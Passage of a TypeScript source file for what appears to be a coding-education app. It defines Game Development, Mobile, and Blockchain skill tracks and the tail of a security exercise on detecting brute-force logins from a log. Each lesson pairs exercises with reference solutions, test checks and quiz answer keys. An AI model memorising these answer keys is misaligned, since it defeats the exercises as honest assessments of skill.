        solution: 'import re\n\nLOG = """2026-10-12T10:00:01 FAIL user=admin ip=10.0.0.5\n2026-10-12T10:00:02 FAIL user=root ip=10.0.0.5\n2026-10-12T10:00:03 OK user=ada ip=192.168.1.2\n2026-10-12T10:00:04 FAIL user=test ip=10.0.0.5\n2026-10-12T10:00:05 FAIL user=ada ip=172.16.0.9\n2026-10-12T10:00:06 FAIL user=guest ip=10.0.0.5\n2026-10-12T10:00:07 OK user=guest ip=10.0.0.5\n2026-10-12T10:00:08 FAIL user=bob ip=172.16.0.9\n""".splitlines()\n\nPATTERN = re.compile(r"^(\\S+) (FAIL|OK) user=(\\S+) ip=(\\S+)$")\n\ndef parse(lines):\n    for line in lines:\n        m = PATTERN.match(line.strip())\n        if m:\n            yield m.groups()\n\ndef detect(lines, threshold=3):\n    fails = {}\n    for _, result, _, ip in parse(lines):\n        if result == "FAIL":\n            fails[ip] = fails.get(ip, 0) + 1\n    return sorted(ip for ip, n in fails.items() if n >= threshold)\n\ndef compromised(lines, threshold=3):\n    flagged = set(detect(lines, threshold))\n    return [(ip, user) for _, result, user, ip in parse(lines) if result == "OK" and ip in flagged]\n',
        hints: ['re.compile(r"^(\\S+) (FAIL|OK) user=(\\S+) ip=(\\S+)$")', 'Count FAIL per IP in a dict, then keep IPs with count >= threshold.', 'compromised: OK lines whose IP is in the flagged set.'],
        check: { type: 'tests', code: 'assert detect(LOG) == ["10.0.0.5"], detect(LOG)\nassert detect(LOG, threshold=2) == ["10.0.0.5", "172.16.0.9"], detect(LOG, threshold=2)\nassert compromised(LOG) == [("10.0.0.5", "guest")], compromised(LOG)\nassert detect(["garbage", ""]) == []\n' },
      },
      cards: [{ front: 'Credential stuffing', back: 'Automated logins using leaked username/password pairs; detect via many failures per IP and unusual successes.' }],
    },
  ],
};

export const gamedev: Track = {
  id: 'gamedev',
  title: 'Game Development',
  icon: '🎮',
  tier: 9,
  color: '#f97316',
  kind: 'skill',
  blurb: 'The maths and patterns behind every game: game loops, delta time, vectors, collisions and AI state machines.',
  depth: 'full',
  lessons: [
    {
      id: 'gd-loop',
      title: 'The game loop & delta time',
      xp: 55,
      body: `
Every game runs a **loop** ~60 times per second:

~~~js
while (running) {
  const dt = now() - last;   // seconds since the previous frame
  processInput();
  update(dt);                // move things, physics, AI
  render();                  // draw the frame
}
~~~

Movement must be multiplied by **delta time** (\`dt\`). Otherwise a player on a 144 Hz monitor moves 2.4× faster than one on 60 Hz:

~~~js
player.x += player.speed * dt;   // speed in pixels per SECOND, not per frame
~~~

Unity's \`Update()\` with \`Time.deltaTime\`, Godot's \`_process(delta)\` and Unreal's \`Tick(DeltaTime)\` all follow this model.
`,
      exercise: {
        kind: 'code',
        lang: 'javascript',
        prompt: 'Write `update(ball, dt, width)` that moves `ball.x` by `ball.vx * dt` and **bounces** off the walls at 0 and `width`: if it goes past a wall, place it at the wall and reverse `vx`. Return the ball.',
        starter: 'function update(ball, dt, width) {\n  return ball;\n}\n',
        solution: 'function update(ball, dt, width) {\n  ball.x += ball.vx * dt;\n  if (ball.x < 0) {\n    ball.x = 0;\n    ball.vx = -ball.vx;\n  } else if (ball.x > width) {\n    ball.x = width;\n    ball.vx = -ball.vx;\n  }\n  return ball;\n}\n',
        hints: ['ball.x += ball.vx * dt;', 'If ball.x > width: clamp to width and flip vx.'],
        check: {
          type: 'tests',
          code: 'let b = update({ x: 10, vx: 100 }, 0.5, 200);\nif (b.x !== 60) throw new Error("after 0.5s at 100px/s, x should be 60, got " + b.x);\nb = update({ x: 190, vx: 100 }, 0.5, 200);\nif (b.x !== 200 || b.vx !== -100) throw new Error("should bounce off the right wall: got x=" + b.x + " vx=" + b.vx);\nb = update({ x: 5, vx: -40 }, 0.25, 200);\nif (b.x !== 0 || b.vx !== 40) throw new Error("should bounce off the left wall: got x=" + b.x + " vx=" + b.vx);\nconst a = update({ x: 0, vx: 60 }, 1 / 60, 500), c = update({ x: 0, vx: 60 }, 1 / 144, 500);\nif (!(Math.abs(a.x - 1) < 1e-9 && Math.abs(c.x * 144 / 60 - 1) < 1e-9)) throw new Error("movement must scale with dt");',
        },
      },
      cards: [{ front: 'Delta time', back: 'Seconds since the last frame; multiply speeds by dt so movement is frame-rate independent.' }],
    },
    {
      id: 'gd-vectors',
      title: 'Vectors & movement',
      xp: 60,
      body: `
Positions, velocities and directions are **2D vectors** \`{x, y}\`:

| Operation | Use |
|---|---|
| \`add(a, b)\` | move by a velocity |
| \`sub(b, a)\` | direction from a to b |
| \`length(v)\` = √(x²+y²) | distance |
| \`normalize(v)\` = v / length | direction with length 1 |
| \`scale(v, s)\` | set speed |
| \`dot(a, b)\` | "facing" checks, angles |

Moving toward a target at a fixed speed: \`pos = add(pos, scale(normalize(sub(target, pos)), speed * dt))\`, without overshooting.
`,
      exercise: {
        kind: 'code',
        lang: 'javascript',
        prompt: 'Implement `length(v)`, `normalize(v)` (returns `{x:0,y:0}` for zero vectors) and `moveTowards(pos, target, maxStep)` that moves at most `maxStep` toward the target and never overshoots.',
        starter: 'function length(v) {\n  return 0;\n}\n\nfunction normalize(v) {\n  return v;\n}\n\nfunction moveTowards(pos, target, maxStep) {\n  return pos;\n}\n',
        solution: 'function length(v) {\n  return Math.hypot(v.x, v.y);\n}\n\nfunction normalize(v) {\n  const len = length(v);\n  return len === 0 ? { x: 0, y: 0 } : { x: v.x / len, y: v.y / len };\n}\n\nfunction moveTowards(pos, target, maxStep) {\n  const d = { x: target.x - pos.x, y: target.y - pos.y };\n  const dist = length(d);\n  if (dist <= maxStep) return { x: target.x, y: target.y };\n  const dir = normalize(d);\n  return { x: pos.x + dir.x * maxStep, y: pos.y + dir.y * maxStep };\n}\n',
        hints: ['length: Math.hypot(v.x, v.y)', 'If the distance is <= maxStep, return the target exactly.', 'Otherwise pos + normalize(target - pos) * maxStep'],
        check: {
          type: 'tests',
          code: 'const near = (a, b) => Math.abs(a - b) < 1e-9;\nif (length({ x: 3, y: 4 }) !== 5) throw new Error("length({3,4}) should be 5");\nconst n = normalize({ x: 0, y: -10 });\nif (!(near(n.x, 0) && near(n.y, -1))) throw new Error("normalize({0,-10}) should be {0,-1}");\nconst z = normalize({ x: 0, y: 0 });\nif (z.x !== 0 || z.y !== 0) throw new Error("normalize of a zero vector should be {0,0}");\nconst p = moveTowards({ x: 0, y: 0 }, { x: 6, y: 8 }, 5);\nif (!(near(p.x, 3) && near(p.y, 4))) throw new Error("should move 5 units toward (6,8): expected (3,4), got (" + p.x + "," + p.y + ")");\nconst q = moveTowards({ x: 0, y: 0 }, { x: 1, y: 1 }, 5);\nif (q.x !== 1 || q.y !== 1) throw new Error("must not overshoot the target");',
        },
      },
      cards: [{ front: 'Normalize a vector', back: 'Divide by its length to get a unit vector (length 1) that keeps only the direction.' }],
    },
    {
      id: 'gd-collision',
      title: 'Collision detection',
      xp: 60,
      body: `
Most games approximate shapes with simple boxes and circles:

**AABB** (axis-aligned bounding boxes) overlap when they overlap on *both* axes:
~~~js
a.x < b.x + b.w && a.x + a.w > b.x && a.y < b.y + b.h && a.y + a.h > b.y
~~~

**Circles** overlap when the distance between centres is less than the sum of radii (compare squared distances to skip the slow square root).

Big worlds use a **broad phase** (spatial grids, quadtrees) to avoid checking every pair: O(n²) → roughly O(n).
`,
      exercise: {
        kind: 'code',
        lang: 'javascript',
        prompt: 'Implement `aabb(a, b)` for rectangles `{x, y, w, h}`, `circles(a, b)` for `{x, y, r}` (touching counts as colliding), and `hits(player, enemies)` returning the ids of enemies (circles) touching the player circle.',
        starter: 'function aabb(a, b) {\n  return false;\n}\n\nfunction circles(a, b) {\n  return false;\n}\n\nfunction hits(player, enemies) {\n  return [];\n}\n',
        solution: 'function aabb(a, b) {\n  return a.x < b.x + b.w && a.x + a.w > b.x && a.y < b.y + b.h && a.y + a.h > b.y;\n}\n\nfunction circles(a, b) {\n  const dx = a.x - b.x;\n  const dy = a.y - b.y;\n  const r = a.r + b.r;\n  return dx * dx + dy * dy <= r * r;\n}\n\nfunction hits(player, enemies) {\n  return enemies.filter((e) => circles(player, e)).map((e) => e.id);\n}\n',
        hints: ['Boxes overlap when they overlap on x AND on y.', 'Circles: dx*dx + dy*dy <= (r1 + r2)^2'],
        check: {
          type: 'tests',
          code: 'if (!aabb({ x: 0, y: 0, w: 10, h: 10 }, { x: 5, y: 5, w: 10, h: 10 })) throw new Error("overlapping boxes should collide");\nif (aabb({ x: 0, y: 0, w: 10, h: 10 }, { x: 20, y: 0, w: 5, h: 5 })) throw new Error("separated boxes must not collide");\nif (aabb({ x: 0, y: 0, w: 10, h: 10 }, { x: 5, y: 20, w: 5, h: 5 })) throw new Error("boxes overlapping only on x must not collide");\nif (!circles({ x: 0, y: 0, r: 5 }, { x: 8, y: 0, r: 3 })) throw new Error("touching circles count as colliding");\nif (circles({ x: 0, y: 0, r: 1 }, { x: 3, y: 3, r: 1 })) throw new Error("distant circles must not collide");\nconst ids = hits({ x: 0, y: 0, r: 10 }, [{ id: "a", x: 5, y: 5, r: 1 }, { id: "b", x: 50, y: 0, r: 5 }, { id: "c", x: -12, y: 0, r: 3 }]);\nif (ids.join() !== "a,c") throw new Error("expected hits a,c, got " + ids.join());',
        },
      },
      cards: [{ front: 'AABB collision', back: 'Two axis-aligned boxes collide iff their x-ranges overlap AND their y-ranges overlap.' }],
    },
    {
      id: 'gd-fsm',
      title: '🛠️ Enemy AI with a state machine',
      xp: 80,
      body: `
Game AI is often a **finite state machine (FSM)**: an enemy is in exactly one state, and **transitions** fire on conditions.

~~~
         player within 50          player within 10
 PATROL ─────────────────▶ CHASE ─────────────────▶ ATTACK
   ▲                         │  ▲                      │
   └───── player beyond 80 ──┘  └─ player beyond 10 ───┘
 any state: health <= 20 → FLEE
~~~

FSMs keep behaviour predictable and debuggable. Bigger games graduate to **behaviour trees** or utility AI, but FSMs are everywhere.
`,
      exercise: {
        kind: 'code',
        lang: 'javascript',
        prompt: 'Implement `nextState(state, distance, health)` following the diagram (FLEE has priority whenever health ≤ 20; FLEE returns to PATROL once health > 20). Then `simulate(steps)` takes `[{distance, health}]` and returns the list of states, starting from `"PATROL"`.',
        starter: 'function nextState(state, distance, health) {\n  return state;\n}\n\nfunction simulate(steps) {\n  return [];\n}\n',
        solution: 'function nextState(state, distance, health) {\n  if (health <= 20) return "FLEE";\n  switch (state) {\n    case "PATROL":\n      return distance <= 50 ? "CHASE" : "PATROL";\n    case "CHASE":\n      if (distance <= 10) return "ATTACK";\n      if (distance > 80) return "PATROL";\n      return "CHASE";\n    case "ATTACK":\n      return distance > 10 ? "CHASE" : "ATTACK";\n    case "FLEE":\n      return "PATROL";\n    default:\n      return "PATROL";\n  }\n}\n\nfunction simulate(steps) {\n  let state = "PATROL";\n  return steps.map(({ distance, health }) => (state = nextState(state, distance, health)));\n}\n',
        hints: ['Check the FLEE condition first: if (health <= 20) return "FLEE";', 'Use a switch on the current state for the other transitions.', 'simulate: keep a running state and map each step to nextState.'],
        check: {
          type: 'tests',
          code: 'const s = simulate([{ distance: 100, health: 100 }, { distance: 40, health: 100 }, { distance: 8, health: 100 }, { distance: 30, health: 100 }, { distance: 90, health: 100 }, { distance: 5, health: 15 }, { distance: 5, health: 60 }]);\nconst want = ["PATROL", "CHASE", "ATTACK", "CHASE", "PATROL", "FLEE", "PATROL"];\nif (s.join() !== want.join()) throw new Error("expected " + want.join(" → ") + " but got " + s.join(" → "));\nif (nextState("CHASE", 60, 100) !== "CHASE") throw new Error("CHASE should continue between 10 and 80");',
        },
      },
      cards: [{ front: 'Finite state machine', back: 'A system that is in exactly one state at a time and moves between states on defined transitions.' }],
    },
  ],
};

export const mobile: Track = {
  id: 'mobile',
  title: 'Mobile App Development',
  icon: '📱',
  tier: 9,
  color: '#22c55e',
  kind: 'skill',
  blurb: 'Native vs cross-platform, app architecture (MVVM), lifecycle, offline data and shipping to the App Store and Google Play.',
  depth: 'overview',
  lessons: [
    {
      id: 'mob-platforms',
      title: 'Platforms & approaches',
      xp: 40,
      body: `
| Approach | Languages & tools | Pros | Cons |
|---|---|---|---|
| **Native Android** | Kotlin + Jetpack Compose | full platform power, best performance | Android only |
| **Native iOS** | Swift + SwiftUI | best Apple integration | Apple only, needs a Mac |
| **Flutter** | Dart | one codebase, own rendering engine, fast | larger app size |
| **React Native** | JavaScript/TypeScript + React | reuse web skills, native widgets | bridge complexity for heavy native work |
| **Kotlin Multiplatform** | Kotlin | share business logic, native UI | newer ecosystem |
| **PWA** | web | no store, instant updates | limited device APIs (esp. iOS) |

Typical choice: a startup ships Flutter or React Native to reach both stores fast; big apps with demanding features often go native.
`,
      exercise: {
        kind: 'quiz',
        questions: [
          { q: 'Which pairing is Google\'s modern recommendation for Android UI?', options: ['Java + XML only', 'Kotlin + Jetpack Compose', 'Swift + UIKit', 'C# + WinForms'], answer: 1 },
          { q: 'One codebase for Android and iOS with its own rendering engine:', options: ['Flutter', 'SwiftUI', 'Jetpack Compose', 'UIKit'], answer: 0 },
          { q: 'A web developer team that knows React wants a mobile app quickly. Best fit:', options: ['React Native', 'Swift', 'C++', 'Assembly'], answer: 0 },
          { q: 'What do you need to build and publish native iOS apps?', options: ['Only Windows', 'A Mac with Xcode', 'Android Studio', 'Nothing'], answer: 1 },
        ],
      },
      cards: [{ front: 'Native vs cross-platform', back: 'Native: one codebase per platform, best performance. Cross-platform (Flutter, RN): one codebase for both, small trade-offs.' }],
    },
    {
      id: 'mob-architecture',
      title: 'App architecture: MVVM, state & lifecycle',
      xp: 45,
      body: `
Mobile apps separate concerns with **MVVM** (Model–View–ViewModel):

- **Model / Repository:** data from the network and local database.
- **ViewModel:** holds UI state, exposes it as a stream (\`StateFlow\`, \`@Observable\`, \`ChangeNotifier\`), handles user actions. It has no reference to the View.
- **View:** Compose / SwiftUI / Flutter widgets that render the state and send events.

**Unidirectional data flow:** *state flows down, events flow up.*

**Lifecycle:** the OS can pause, stop or kill your app at any time (calls, low memory, rotation). Persist important state; never assume the app stays in memory. Do slow work off the main thread (coroutines, async/await, isolates) or the UI freezes.

**Offline-first:** cache data locally (Room, Core Data/SwiftData, SQLite, Hive) and sync later. Mobile networks drop constantly.
`,
      exercise: {
        kind: 'quiz',
        questions: [
          { q: 'In MVVM, where should "is the list loading?" state live?', options: ['In the View', 'In the ViewModel', 'In the database', 'In a global variable'], answer: 1 },
          { q: 'Why must network calls not run on the main (UI) thread?', options: ['They are illegal', 'The UI freezes until they finish', 'They run faster', 'The store rejects the app'], answer: 1 },
          { q: '"State flows down, events flow up" describes…', options: ['Unidirectional data flow', 'Two-way binding', 'REST', 'Recursion'], answer: 0 },
          { q: 'The OS kills your app in the background. What survives?', options: ['Everything in memory', 'Only what you persisted', 'Nothing ever', 'Only images'], answer: 1 },
        ],
      },
      cards: [{ front: 'MVVM', back: 'Model (data), View (UI), ViewModel (UI state + logic, observable by the View, independent of it).' }],
    },
    {
      id: 'mob-shipping',
      title: 'Permissions, performance & publishing',
      xp: 40,
      body: `
**Permissions:** ask at the moment of need, explain why, and handle "deny" gracefully (camera, location, notifications).

**Performance:** keep 60–120 fps (avoid heavy work while scrolling), keep app size small, test on low-end devices and slow networks.

**Publishing:**
1. **Sign** the app (Android keystore / Apple certificates and provisioning profiles).
2. Build release bundles (\`.aab\` for Play, \`.ipa\` via Xcode/App Store Connect).
3. Store listing: screenshots, description, privacy policy, data-safety forms.
4. Review (Apple's is stricter) → staged rollout → monitor crashes (Crashlytics, Sentry) and reviews.

**Updates:** users update slowly, so APIs must stay backwards compatible for old app versions.
`,
      exercise: {
        kind: 'quiz',
        questions: [
          { q: 'When should an app ask for location permission?', options: ['On first launch, for everything', 'When the user uses a feature that needs it', 'Never, just read it', 'Only after a crash'], answer: 1 },
          { q: 'Google Play expects uploads in which format?', options: ['.exe', '.aab (Android App Bundle)', '.ipa', '.zip of source'], answer: 1 },
          { q: 'Why keep backend APIs backwards compatible?', options: ['Old app versions stay installed for a long time', 'It is faster', 'Stores require JSON', 'It isn\'t needed'], answer: 0 },
          { q: 'A staged rollout means…', options: ['Releasing to a percentage of users first', 'Releasing only on weekends', 'Testing on emulators', 'Publishing source code'], answer: 0 },
        ],
      },
      cards: [{ front: 'Staged rollout', back: 'Release an update to a small percentage of users first, monitor crashes, then expand.' }],
    },
  ],
};

export const blockchain: Track = {
  id: 'blockchain',
  title: 'Blockchain Fundamentals',
  icon: '🔗',
  tier: 9,
  color: '#6366f1',
  kind: 'skill',
  blurb: 'Hashes, blocks, proof of work, consensus, wallets and smart contracts: build a mini blockchain in Python.',
  depth: 'full',
  lessons: [
    {
      id: 'bc-chain',
      title: '🛠️ Hashes & a chain of blocks',
      xp: 70,
      body: `
A **blockchain** is a list of blocks where each block stores the **hash of the previous block**. Change any old block and its hash changes, which breaks every link after it. That's what makes the history **tamper-evident**.

A **cryptographic hash** (SHA-256) maps any data to a fixed 256-bit fingerprint:
- deterministic (same input → same hash),
- tiny changes produce completely different hashes,
- practically impossible to reverse or find collisions.

~~~python
import hashlib, json
block = {"index": 1, "data": "Ada pays Bob 5", "prev_hash": "000…"}
block_hash = hashlib.sha256(json.dumps(block, sort_keys=True).encode()).hexdigest()
~~~
`,
      exercise: {
        kind: 'code',
        lang: 'python',
        prompt: 'Implement `Blockchain` with a genesis block (`index 0`, `data "genesis"`, `prev_hash "0"`), `add(data)`, and `is_valid()` that recomputes every hash and checks every `prev_hash` link. Use `block_hash(block)` (provided) to hash a block without its own `hash` field.',
        starter: 'import hashlib\nimport json\n\ndef block_hash(block):\n    content = {k: v for k, v in block.items() if k != "hash"}\n    return hashlib.sha256(json.dumps(content, sort_keys=True).encode()).hexdigest()\n\nclass Blockchain:\n    def __init__(self):\n        self.chain = []\n\n    def add(self, data):\n        pass\n\n    def is_valid(self):\n        return True\n',
        solution: 'import hashlib\nimport json\n\ndef block_hash(block):\n    content = {k: v for k, v in block.items() if k != "hash"}\n    return hashlib.sha256(json.dumps(content, sort_keys=True).encode()).hexdigest()\n\nclass Blockchain:\n    def __init__(self):\n        genesis = {"index": 0, "data": "genesis", "prev_hash": "0"}\n        genesis["hash"] = block_hash(genesis)\n        self.chain = [genesis]\n\n    def add(self, data):\n        prev = self.chain[-1]\n        block = {"index": prev["index"] + 1, "data": data, "prev_hash": prev["hash"]}\n        block["hash"] = block_hash(block)\n        self.chain.append(block)\n        return block\n\n    def is_valid(self):\n        for i, block in enumerate(self.chain):\n            if block["hash"] != block_hash(block):\n                return False\n            if i > 0 and block["prev_hash"] != self.chain[i - 1]["hash"]:\n                return False\n        return True\n',
        hints: ['Each new block stores prev_hash = previous block\'s hash, then its own hash = block_hash(block).', 'is_valid: recompute each hash and compare prev_hash with the previous block.'],
        check: { type: 'tests', code: 'bc = Blockchain()\nassert len(bc.chain) == 1 and bc.chain[0]["data"] == "genesis"\nbc.add("Ada pays Bob 5"); bc.add("Bob pays Cy 2")\nassert len(bc.chain) == 3 and bc.chain[2]["prev_hash"] == bc.chain[1]["hash"]\nassert bc.is_valid()\nbc.chain[1]["data"] = "Ada pays Bob 500"\nassert not bc.is_valid(), "tampering with data must be detected"\nbc.chain[1]["hash"] = block_hash(bc.chain[1])\nassert not bc.is_valid(), "re-hashing a tampered block must still break the next link"\n' },
      },
      cards: [{ front: 'Why is a blockchain tamper-evident?', back: 'Each block contains the previous block\'s hash, so changing one block invalidates every following link.' }],
    },
    {
      id: 'bc-pow',
      title: '🛠️ Proof of work: mining',
      xp: 70,
      body: `
Anyone could rewrite a chain by re-hashing every block, unless making a block is **expensive**. **Proof of work** requires each block's hash to start with a number of zeros. The only way to find one is brute force: try different **nonces** until it works.

~~~
difficulty 4 → hash must start with "0000" → ~65,536 tries on average
~~~

Bitcoin adjusts difficulty so a block is found every ~10 minutes worldwide. Rewriting history would require redoing all that work faster than the honest network. **Proof of stake** (Ethereum since 2022) replaces energy with staked coins that can be slashed for cheating.
`,
      exercise: {
        kind: 'code',
        lang: 'python',
        prompt: 'Implement `mine(block, difficulty)` that sets `block["nonce"]` (starting at 0, counting up) until `block_hash(block)` starts with `difficulty` zeros, then stores `block["hash"]` and returns the block. Also `valid_pow(block, difficulty)`.',
        starter: 'import hashlib\nimport json\n\ndef block_hash(block):\n    content = {k: v for k, v in block.items() if k != "hash"}\n    return hashlib.sha256(json.dumps(content, sort_keys=True).encode()).hexdigest()\n\ndef mine(block, difficulty):\n    return block\n\ndef valid_pow(block, difficulty):\n    return False\n',
        solution: 'import hashlib\nimport json\n\ndef block_hash(block):\n    content = {k: v for k, v in block.items() if k != "hash"}\n    return hashlib.sha256(json.dumps(content, sort_keys=True).encode()).hexdigest()\n\ndef mine(block, difficulty):\n    prefix = "0" * difficulty\n    block["nonce"] = 0\n    while not block_hash(block).startswith(prefix):\n        block["nonce"] += 1\n    block["hash"] = block_hash(block)\n    return block\n\ndef valid_pow(block, difficulty):\n    return block.get("hash") == block_hash(block) and block["hash"].startswith("0" * difficulty)\n',
        hints: ['prefix = "0" * difficulty', 'Increment block["nonce"] in a while loop until block_hash(block).startswith(prefix).'],
        check: { type: 'tests', code: 'b = mine({"index": 1, "data": "hello", "prev_hash": "abc"}, 3)\nassert b["hash"].startswith("000") and b["hash"] == block_hash(b), b.get("hash")\nassert valid_pow(b, 3)\nb2 = mine({"index": 1, "data": "hello", "prev_hash": "abc"}, 3)\nassert b2["nonce"] == b["nonce"], "mining must be deterministic: start at nonce 0"\nb["data"] = "tampered"\nassert not valid_pow(b, 3)\n' },
      },
      cards: [{ front: 'Nonce (mining)', back: 'A number miners change repeatedly until the block hash meets the difficulty target.' }],
    },
    {
      id: 'bc-concepts',
      title: 'Wallets, consensus & smart contracts',
      xp: 45,
      body: `
- **Wallets & keys:** a wallet is a **private key** (secret) and its **public address**. Transactions are **signed** with the private key; anyone can verify the signature with the public key. Lose the key and you lose the funds. There's no password reset.
- **Consensus:** nodes agree on one history via proof of work, proof of stake or BFT-style voting.
- **Smart contracts:** programs stored on-chain (Solidity on Ethereum, Rust on Solana). Every node executes them; users pay **gas** for computation.
- **Layer 2s & rollups:** process transactions off-chain and post compressed proofs to the main chain for scale.
- **Oracles:** bring off-chain data (prices, weather) on-chain, a common attack surface.

Healthy scepticism helps: many blockchain projects don't need a blockchain. It fits when parties who don't trust each other need a shared, tamper-evident ledger without a central operator.
`,
      exercise: {
        kind: 'quiz',
        questions: [
          { q: 'What proves that a transaction was authorised by the owner?', options: ['The username', 'A digital signature made with the private key', 'The block number', 'An email'], answer: 1 },
          { q: 'What do users pay to run smart contract code on Ethereum?', options: ['Rent', 'Gas', 'Nothing', 'A subscription'], answer: 1 },
          { q: 'Oracles provide…', options: ['Off-chain data to smart contracts', 'Mining hardware', 'Private keys', 'Faster hashing'], answer: 0 },
          { q: 'You lose your private key. You can…', options: ['Reset it by email', 'No longer access the funds', 'Ask the miners', 'Fork the chain'], answer: 1 },
        ],
      },
      cards: [{ front: 'Private key vs address', back: 'The private key signs transactions (keep secret); the public address receives funds and verifies signatures.' }],
    },
  ],
};

export const SKILL_TRACKS = [reactTrack, dataAnalysis, security, gamedev, mobile, blockchain];
